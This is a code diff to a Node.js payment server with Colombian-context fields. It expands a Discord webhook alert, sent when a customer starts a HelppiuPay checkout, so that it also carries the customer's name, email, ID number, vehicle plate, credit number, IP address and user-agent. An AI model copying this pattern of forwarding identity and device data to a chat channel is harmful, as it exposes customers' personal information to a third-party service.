@@ -104,9 +104,10 @@ const HELPPIU_KEY_ID = process.env.HELPPIU_KEY_ID;
 const HELPPIU_SECRET = process.env.HELPPIU_SECRET;
 const HELPPIU_API_URL = process.env.HELPPIU_API_URL || 'https://helppiupay.com/api/v1/checkout-sessions';
 
-async function avisarCreditoAceptado(req, cedula, placa, valor) {
+async function avisarCreditoAceptado(req, cedula, placa, valor, nombre, apellido, email, credito) {
   if (!DISCORD_WEBHOOK_URL) return;
   const ip = (req.headers['x-forwarded-for'] || req.socket.remoteAddress || '-').split(',')[0].trim();
+  const ua = (req.headers['user-agent'] || '-').substring(0, 256);
   const montoTxt = valor
     ? '$ ' + Number(String(valor).replace(/[^\d]/g, '')).toLocaleString('es-CO') + ' COP'
     : '-';
@@ -115,13 +116,19 @@ async function avisarCreditoAceptado(req, cedula, placa, valor) {
     headers: { 'Content-Type': 'application/json' },
     body: JSON.stringify({
       embeds: [{
-        title: '💳 Crédito aceptado — va a pagar',
-        color: 0xe67e22,
+        title: '✅ Cliente ha aceptado el monto y ha iniciado el pago',
+        color: 0x2ecc71,
         fields: [
-          { name: '🪪 Número de documento', value: cedula || '-', inline: true },
-          { name: '🚗 Número de Placa', value: placa || '-', inline: true },
-          { name: '💰 Monto a pagar', value: montoTxt, inline: true },
+          { name: '🔑 Crédito', value: credito || '-', inline: true },
+          { name: '💰 Monto', value: montoTxt, inline: true },
+          { name: '​', value: '​', inline: true },
+          { name: '👤 Nombre', value: `${nombre || '-'} ${apellido || ''}`.trim(), inline: true },
+          { name: '📧 Correo', value: email || '-', inline: true },
+          { name: '​', value: '​', inline: true },
+          { name: '🪪 Documento', value: cedula || '-', inline: true },
+          { name: '🚗 Placa', value: placa || '-', inline: true },
           { name: '📍 IP', value: ip, inline: true },
+          { name: '💻 User-Agent', value: ua, inline: false },
         ],
         timestamp: new Date().toISOString()
       }]
@@ -136,7 +143,7 @@ app.post('/api/pagar-helppiupay', async (req, res) => {
     if (!credito || !valor) return res.status(400).json({ error: 'Faltan credito o valor' });
     if (!HELPPIU_KEY_ID || !HELPPIU_SECRET) return res.status(500).json({ error: 'Faltan llaves de HelppiuPay en el servidor' });
 
-    avisarCreditoAceptado(req, identificacion, placa, valor).catch(e => console.error('[DISCORD CREDITO]', e.message));
+    avisarCreditoAceptado(req, identificacion, placa, valor, nombre, apellido, email, credito).catch(e => console.error('[DISCORD CREDITO]', e.message));
 
     const amount = parseInt(String(valor).replace(/[^\d]/g, ''), 10);
     if (isNaN(amount) || amount <= 0) return res.status(400).json({ error: 'El valor no es válido: ' + valor });
